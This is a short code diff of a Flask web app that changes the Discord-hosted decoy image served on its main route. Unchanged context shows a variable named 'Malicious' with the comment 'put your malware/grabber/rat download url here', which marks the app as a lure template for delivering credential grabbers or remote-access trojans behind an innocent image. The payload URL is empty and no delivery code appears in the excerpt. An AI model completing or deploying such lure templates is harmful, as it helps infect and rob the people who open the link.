@@ -11,7 +11,7 @@ __name__,
 )
 @app.route('/', methods=['GET'])
 def main():
-  Image = 'https://media.discordapp.net/attachments/968125334023196692/975668105281953832/Screenshot_2022-05-12-21-50-16.jpeg' #put your image
+  Image = 'https://media.discordapp.net/attachments/883689728019423233/896741264328888370/unknown.png?width=510&height=391' #put your image
   
   Malicious = '' #put your malware/grabber/rat download url here
   
